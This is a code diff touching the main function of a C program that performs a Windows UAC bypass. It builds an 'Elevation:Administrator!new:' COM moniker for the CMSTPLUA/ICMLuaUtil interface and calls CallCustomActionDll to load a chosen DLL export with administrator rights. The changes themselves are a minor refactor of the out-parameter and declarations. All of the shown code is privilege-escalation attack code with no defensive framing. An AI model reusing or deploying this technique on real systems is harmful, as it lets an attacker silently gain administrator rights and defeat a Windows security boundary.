@@ -296,10 +296,9 @@ int main()
 	PWCHAR Buffer = NULL;
 	LPCWSTR Out = NULL;
 	ICMLuaUtil* Util = NULL;
-    ULONG* outParam = (ULONG*)malloc(sizeof(ULONG));
+    ULONG outParam = 0;
     HMODULE hModule = NULL;
-    *outParam = 0;
-
+    BIND_OPTS3 BindOpts;
     LPCWSTR dllPath = DLL_PATH;
     LPCWSTR exportName = EXPORT_NAME;
     LPCWSTR param3 = L"ThisIsTestArgument";
@@ -307,13 +306,7 @@ int main()
 
 
 	WCHAR ElevationMonikerString[200] = L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";
-	BIND_OPTS3 BindOpts;
-
-
-
-
-
-
+	
 	ZeroMemory(&BindOpts, sizeof(BindOpts));
 
     BindOpts.cbStruct = sizeof(BindOpts);
@@ -343,7 +336,7 @@ int main()
     }
 
 
-    hResult = Util->CallCustomActionDll(dllPath, exportName, param3, param4, outParam);
+    hResult = Util->CallCustomActionDll(dllPath, exportName, param3, param4, &outParam);
     if (!SUCCEEDED(hResult))
         printf("[-] CallCustomActionDll Failed With Error 0x%08X\n", hResult);
     else
@@ -364,5 +357,4 @@ _EXIT_ROUTINE:
 
     return ERROR_SUCCESS;
 
-	return 0;
 }
